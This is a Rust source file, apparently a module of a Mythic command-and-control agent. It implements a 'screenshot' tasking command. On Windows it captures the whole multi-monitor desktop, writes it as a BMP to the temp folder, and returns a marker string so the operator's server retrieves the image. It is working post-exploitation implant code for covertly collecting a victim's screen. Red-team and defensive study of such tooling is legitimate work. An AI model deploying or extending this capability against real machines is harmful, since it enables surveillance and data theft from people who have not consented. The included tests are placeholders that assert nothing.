use serde::{Deserialize, Serialize};
use std::error::Error;
use std::result::Result;
use crate::{AgentTask, mythic_success, mythic_error};

#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::shared::windef::HBITMAP;
#[cfg(target_os = "windows")]
use winapi::um::wingdi::*;
#[cfg(target_os = "windows")]
use winapi::um::winuser::*;

// Command structure for Mythic
#[derive(Serialize, Deserialize)]
pub struct ScreenshotArgs {}

// RPC message structures for file upload
#[derive(Serialize, Deserialize)]
struct MythicRPCPutFileMessage {
    pub task_id: String,
    pub file_contents: Vec<u8>,
    pub filename: Option<String>,
    pub is_screenshot: bool,
}

#[derive(Serialize, Deserialize)]
struct MythicRPCPutFileResponse {
    pub success: bool,
    pub error: Option<String>,
    pub agent_file_id: Option<String>,
}

/// Wrapper function for compatibility with the tasking system
pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args = ScreenshotArgs {};
    match execute_screenshot(args, &task.id) {
        Ok(output) => {
            // For screenshot, we need to return the special format that triggers automatic download
            // The overlay server will detect the "screenshot_captured:" prefix and create a download task
            Ok(mythic_success!(task.id, output))
        },
        Err(error) => {
            Ok(mythic_error!(task.id, format!("Screenshot failed: {}", error)))
        },
    }
}

/// Take screenshots using Apollo's method - save locally and return file path for download
#[cfg(target_os = "windows")]
pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
    unsafe {
        // FIX: Use virtual screen for multi-monitor support and GetDeviceCaps for DPI scaling
        let vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
        let vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
        let vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        let vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        if vw == 0 || vh == 0 {
            return Err("No display found or virtual screen size is zero".to_string());
        }

        // Get screen DC
        let hdc_screen = GetDC(ptr::null_mut());
        if hdc_screen.is_null() {
            return Err("Failed to get screen DC".to_string());
        }

        // FIX: Get physical pixel dimensions (accounts for DPI scaling)
        let physical_width = GetDeviceCaps(hdc_screen, HORZRES);
        let physical_height = GetDeviceCaps(hdc_screen, VERTRES);

        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return Err("Failed to create memory DC".to_string());
        }

        let hbitmap = CreateCompatibleBitmap(hdc_screen, physical_width, physical_height);
        if hbitmap.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return Err("Failed to create compatible bitmap".to_string());
        }

        // Select bitmap into memory DC
        let _old_bitmap = SelectObject(hdc_mem, hbitmap as *mut _);
        
        // FIX: Use StretchBlt to handle DPI scaling from virtual screen to physical bitmap
        let result = StretchBlt(
            hdc_mem,           // destination DC
            0,                 // destination x
            0,                 // destination y  
            physical_width,    // destination width (physical pixels)
            physical_height,   // destination height (physical pixels)
            hdc_screen,        // source DC
            vx,                // source x (virtual screen)
            vy,                // source y (virtual screen)
            vw,                // source width (logical coordinates)
            vh,                // source height (logical coordinates)
            SRCCOPY,           // operation
        );

        if result == 0 {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return Err("StretchBlt failed".to_string());
        }

        // Save screenshot to file
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let filename = format!("screenshot_{}.bmp", timestamp);
        let screenshot_path = std::env::temp_dir().join(&filename);
        
        // Save bitmap to file using physical dimensions
        if let Err(e) = save_bitmap_to_file(hbitmap, physical_width as u32, physical_height as u32, &screenshot_path) {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return Err(format!("Failed to save bitmap: {}", e));
        }

        // Cleanup
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(ptr::null_mut(), hdc_screen);

        // Return file path in Apollo's format for automatic download
        let file_size = std::fs::metadata(&screenshot_path)
            .map(|m| m.len())
            .unwrap_or(0);

        Ok(format!(
            "screenshot_captured:{}:{}:{}:screenshot",
            screenshot_path.to_string_lossy(),
            file_size,
            filename
        ))
    }
}

/// Helper function: Save an HBITMAP to a .bmp file (Apollo's approach)
#[cfg(target_os = "windows")]
unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, file_path: &std::path::Path) -> Result<(), String> {
    use std::fs::File;
    use std::io::Write;
    
    // Calculate bitmap data size
    let bits_per_pixel = 24; // BMP uses 24-bit RGB
    let bytes_per_pixel = bits_per_pixel / 8;
    let row_size = ((width * bytes_per_pixel + 3) / 4) * 4; // 4-byte aligned
    let image_size = row_size * height;
    
    // Create BMP file header
    let file_size = 14 + 40 + image_size; // File header + Info header + Image data
    let mut bmp_header = vec![0u8; 14];
    bmp_header[0] = b'B';
    bmp_header[1] = b'M';
    bmp_header[2..6].copy_from_slice(&file_size.to_le_bytes());
    bmp_header[10..14].copy_from_slice(&54u32.to_le_bytes()); // Offset to image data
    
    // Create BMP info header
    let mut info_header = vec![0u8; 40];
    info_header[0..4].copy_from_slice(&40u32.to_le_bytes()); // Header size
    info_header[4..8].copy_from_slice(&(width as i32).to_le_bytes());
    info_header[8..12].copy_from_slice(&(height as i32).to_le_bytes());
    info_header[12..14].copy_from_slice(&1u16.to_le_bytes()); // Planes
    info_header[14..16].copy_from_slice(&(bits_per_pixel as u16).to_le_bytes());
    info_header[20..24].copy_from_slice(&image_size.to_le_bytes());
    
    // Get bitmap data
    let mut pixel_data = vec![0u8; image_size as usize];
    let hdc = GetDC(ptr::null_mut());
    
    let mut bmp_info = BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER {
            biSize: 40,
            biWidth: width as i32,
            biHeight: height as i32,
            biPlanes: 1,
            biBitCount: bits_per_pixel as u16,
            biCompression: BI_RGB,
            biSizeImage: image_size,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        },
        bmiColors: [RGBQUAD {
            rgbBlue: 0,
            rgbGreen: 0,
            rgbRed: 0,
            rgbReserved: 0,
        }],
    };
    
    let result = GetDIBits(
        hdc,
        hbitmap,
        0,
        height,
        pixel_data.as_mut_ptr() as *mut _,
        &mut bmp_info,
        DIB_RGB_COLORS,
    );
    
    ReleaseDC(ptr::null_mut(), hdc);
    
    if result == 0 {
        return Err("GetDIBits failed".to_string());
    }
    
    // Write BMP file
    let mut file = File::create(file_path)
        .map_err(|e| format!("Failed to create file: {}", e))?;
    
    file.write_all(&bmp_header)
        .map_err(|e| format!("Failed to write header: {}", e))?;
    file.write_all(&info_header)
        .map_err(|e| format!("Failed to write info header: {}", e))?;
    file.write_all(&pixel_data)
        .map_err(|e| format!("Failed to write pixel data: {}", e))?;
    
    Ok(())
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
    Err("screenshot command is not implemented for macOS".to_string())
}

// Fallback for other platforms
#[cfg(not(any(target_os = "windows", target_os = "macos")))]
pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
    Err("screenshot command is only supported on Windows".to_string())
}

/// Direct command handler for integration with command dispatch system
pub fn handle_screenshot_command(args: &str, task_id: &str) -> Result<String, String> {
    let screenshot_args: ScreenshotArgs = serde_json::from_str(args)
        .map_err(|e| format!("Failed to parse screenshot arguments: {}", e))?;
    
    execute_screenshot(screenshot_args, task_id)
}

// Note: RPC implementation is handled by the Python side
// The file upload mechanism works through Mythic's built-in file transfer system

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_screenshot_args_parsing() {
        let args = ScreenshotArgs {};
        // Just verify the struct can be created
        assert!(true);
    }

    #[test]
    fn test_screenshot_command_handler() {
        let result = handle_screenshot_command("{}", "test_task_id");
        // On non-Windows, this should return an error about platform not supported
        // On Windows, it might succeed or fail depending on the environment
        assert!(result.is_ok() || result.is_err());
    }
}